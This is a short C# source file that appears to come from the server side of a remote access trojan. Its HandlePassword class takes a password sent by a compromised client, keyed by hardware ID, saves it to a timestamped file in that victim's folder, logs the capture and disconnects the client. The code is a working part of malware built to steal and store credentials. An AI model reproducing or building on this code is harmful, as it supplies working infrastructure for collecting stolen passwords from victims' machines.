using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
    internal class HandlePassword
    {
        public void SavePassword(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var password = unpack_msgpack.ForcePathObject("Password").GetAsString();
                var fullPath = Path.Combine(Application.StartupPath,
                    "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\Password");
                if (!Directory.Exists(fullPath))
                    Directory.CreateDirectory(fullPath);
                File.WriteAllText(fullPath + $"\\Password_{DateTime.Now:MM-dd-yyyy HH;mm;ss}.txt", password);
                new HandleLogs().Addmsg(
                    $"Client {client.Ip} password saved success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/Password",
                    Color.Purple);
                client.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Password saved error: {ex.Message}", Color.Red);
            }
        }
    }
}